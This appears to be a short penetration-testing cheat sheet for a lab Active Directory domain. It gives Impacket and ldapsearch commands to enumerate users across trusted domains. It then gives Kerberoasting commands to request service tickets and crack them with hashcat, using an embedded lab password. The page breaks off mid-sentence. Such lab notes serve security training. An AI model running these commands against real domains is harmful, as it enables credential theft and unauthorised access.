# Enumeration with user

## Impacket

```
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
```



## LDAP

Interresting queries for LDAP



{% embed url="https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/" %}

```
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```

If a trust relationship is established between domains, yu can request users of the others domains with the previous command.

```
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"
```



## # Kerberoasting

Some users have an SPN tag set.

```
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
# or
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
# and then crack with hashcat
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

For the first command, the hashes are stored in the file **kerberoasting.hashes**. Notice also that you can see with this command if the delegation is constrained.

or you can also use
